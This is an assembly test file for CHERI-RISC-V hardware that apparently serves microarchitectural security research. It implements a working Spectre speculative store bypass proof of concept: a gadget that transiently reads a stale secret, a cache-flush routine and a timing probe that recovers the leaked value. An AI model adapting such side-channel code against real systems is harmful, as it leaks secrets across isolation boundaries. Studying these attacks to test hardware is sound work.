#include "../s_sources/hpm_macros.h"

/*
Spectre-STL-CHERI

Author: Franz Fuchs
The store and the load go to the same address, but memory
disambiguation resolves them speculatively as non-dependent.
Therefore, the load is issued before the store and the load
will return stale data.

In simulation:
load to: 0x0000000080003400
*/

.text

change_to_cap_mode:
  // set pcc flags such that capability encoding
  // mode is used
  // This is described in the CHERI Specification v7
  cspecialr ct3, pcc
  li t1, 1
  csetflags ct3, ct3, t1
#ifdef VCU_118
  li  t2, 0xc0000018
#else
  li  t2, 0x80000018
#endif
  csetoffset  ct3, ct3, t2
  cjr ct3

init_caps:

    // prepare hardware performance monitoring
    // do counting of load request sent by the CPU
    HPM_SELECT_EVENT(3, 0x30)
    // read value of counter 3 and store it to s10
    HPM_M_READ_X (s10, 3)


    /*
     * data capabilities
     */

#ifdef VCU_118
    // cs1 is a capability to [0xc0001000 - 0xc0002000]
    li  t2, 0xc0001000
    cfromptr cs1, ddc, t2
    li t1, 0x1000
    csetbounds cs1, cs1, t1

    // cs2 is a capability to [0xc0002000 - 0xc0003000]
    li  t2, 0xc0002000
    cfromptr cs2, ddc, t2
    li t1, 0x1000
    csetbounds cs2, cs2, t1

    // cs3 is a capability to [0xc0003000 - 0xc0004000]
    li  t2, 0xc0003000
    cfromptr cs3, ddc, t2
    li t1, 0x1000
    csetbounds cs3, cs3, t1
#else
    // cs1 is a capability to [0x80001000 - 0x80002000]
    li  t2, 0x80001000
    cfromptr cs1, ddc, t2
    li t1, 0x1000
    csetbounds cs1, cs1, t1

    // cs2 is a capability to [0x80002000 - 0x80003000]
    li  t2, 0x80002000
    cfromptr cs2, ddc, t2
    li t1, 0x1000
    csetbounds cs2, cs2, t1

    // cs3 is a capability to [0x80003000 - 0x80004000]
    li  t2, 0x80003000
    cfromptr cs3, ddc, t2
    li t1, 0x1000
    csetbounds cs3, cs3, t1
#endif

    /*
     * code capabilities
     */

    cllc cs4, spec_stl
    li t1, 0x100
    csetbounds cs4, cs4, t1

    cllc cs5, flush
    li t1, 0x100
    csetbounds cs5, cs5, t1

    cjalr cra, cs5


    // store cs2 at 0(cs1)
    csc cs2, 0(cs1)

    // store secret at 0(cs2)
    li t2, 0x400
    csd t2, 0(cs2)

    li a4, 0x200

    // perform attack
    cjalr cra, cs4

    HPM_M_READ_X (s11, 3)

probe:
#ifdef VCU_118
    li  t2, 0xc0003200
    li  t3, 0xc0070000
#else
    li  t2, 0x80003200
    li  t3, 0x80070000
#endif
    cfromptr ct2, ddc, t2
    cfromptr ct6, ddc, t3
    add t4, x0, x0
    addi t5, x0, 16
probe_loop:
    rdcycle t0
    cld t3, 0(ct2)
    rdcycle t1
    sub t1, t1, t0
    csd t1, 0(ct6)
    cincoffsetimm ct6, ct6, 8
    cincoffsetimm ct2, ct2, 64
    addi t4, t4, 1
    blt t4, t5, probe_loop
    nop
    nop

    // we expect 257 + 2 loads to have happened
    // one architectural load in spec_stl
    // one transient load in spec_stl, which
    // leaks the secret
    HPM_CAP_TEST(s10, s11, 259)

idle_here:
    add t4, x0, x0
    beq t4, x0, idle_here

    .rept 0x20
    nop
    .endr

spec_stl:

    clc ca1, 0(cs1)
    // store to cs2
    csd a4, 0(ca1)
    // memory disambiguation will lead to
    // this being executed with stale data
    cld a2, 0(cs2)
    cincoffset cs3, cs3, a2
    cld a3, 0(cs3)
    cret

flush:
    // flush entire cache
    
    // use ddc for that
    // set to memory address not used by
    // other sections
#ifdef VCU_118
    li t2, 0xc0010000
#else
    li t2, 0x80010000
#endif
    li t3, 0x4000
    add t3, t2, t3
    cfromptr ct1, ddc, t2
flush_loop:
    cld t0, 0(ct1)
    cincoffsetimm ct1, ct1, 64
    cgetaddr t0, ct1
    ble t0, t3, flush_loop

    // fence instruction
    fence rw, rw
    cret


.section .tohost , "adw"

tohost:
  .dword 0x0000000000000000
